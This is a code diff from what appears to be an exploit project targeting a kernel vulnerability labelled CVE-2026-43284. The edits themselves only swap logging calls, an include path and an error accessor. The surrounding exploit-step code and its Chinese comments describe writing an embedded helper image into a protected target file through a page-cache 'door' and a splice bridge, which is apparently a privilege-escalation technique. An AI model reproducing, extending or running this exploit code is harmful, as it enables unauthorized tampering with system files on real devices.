@@ -5,7 +5,7 @@
  *  the access in.
  */
 #include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
-#include "jni/gl_log.hpp"
+#include "support/gl_log.h"
 #include "backend/cve_2026_43284/landing/crash_dump_bridge.hpp"
 #include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
 #include "backend/cve_2026_43284/landing/encap_peer.hpp"
@@ -91,7 +91,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             }
         }
         written.entries = attempted < written.capacity_blocks ? attempted : written.capacity_blocks;
-        GL_LOGI("journal: n=%zu overflow=%d rolled=%zu incomplete=%d", written.entries,
+        debug("journal: n=%zu overflow=%d rolled=%zu incomplete=%d", written.entries,
                 outcome.journal_overflow ? 1 : 0, outcome.blocks_rolled_back,
                 outcome.rollback_incomplete ? 1 : 0);
         if (!written.ok && outcome.rollback_incomplete && !decorated_refusal.empty() && refusal != nullptr) {
@@ -115,7 +115,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         if (!encap_peer.open(context.params->sa.encap_port)) {
             static char peer_message[96] = {};
             std::snprintf(peer_message, sizeof(peer_message), "step-encap-peer-failed:%d",
-                          encap_peer.error());
+                          encap_peer.error_code());
             *refusal = peer_message;
             return StepOutcome::Refused;
         }
@@ -138,7 +138,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         /* 本次装配的来源（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:70-82
          *  —— 那边的写来源是 file_fd，App 打不开 vendor 文件时改用 patch #1 写下的 helper 桥；
          *  :129-167 的读同理。这里把这次装配的门、fd 与来源报出来，逐块的 fd 见窗口层）。 */
-        GL_LOGI("runner: door=%s target_fd=%d bridge=%d encap_port=%u sa_set=%d width=%zu",
+        debug("runner: door=%s target_fd=%d bridge=%d encap_port=%u sa_set=%d width=%zu",
                 context.door_path, target_fd, target_fd < 0 ? 1 : 0,
                 static_cast<unsigned>(context.params->sa.encap_port),
                 context.params->sa.set ? 1 : 0, landing::kWriteWidth);
@@ -192,7 +192,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 request.verify_every = 0U;
                 /* patch #1 的镜像与来源（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:19-50
                  *  —— 那边 patch #1 = 内嵌 helper 按 kCrashDumpBlockBytes 逐块写进目标，offset 从 0 起）。 */
-                GL_LOGI("patch1: image=%zu offset=%llu width=%zu blocks=%zu journal_bytes=%zu source_fd=%d bridge=%d",
+                debug("patch1: image=%zu offset=%llu width=%zu blocks=%zu journal_bytes=%zu source_fd=%d bridge=%d",
                         request.image.size(), static_cast<unsigned long long>(request.offset), request.width,
                         image_blocks(request.image, request.width),
                         journal_bytes_for(request.image, request.width), target_fd, target_fd < 0 ? 1 : 0);
@@ -256,7 +256,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         }
         /* 这一步的结果（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:44-50
          *  —— 那边的判据就是每块 write16 的返回码；组帧层的失败码另见 pagecache_write.hpp last_error）。 */
-        GL_LOGI("runner: step=%s outcome=%s refusal=%s splice_error=%d",
+        debug("runner: step=%s outcome=%s refusal=%s splice_error=%d",
                 pagecache_step_name(step), ran ? "ran" : "refused",
                 body_refusal != nullptr ? body_refusal : "(null)", window.last_error());
         static_cast<void>(access.shutdown());
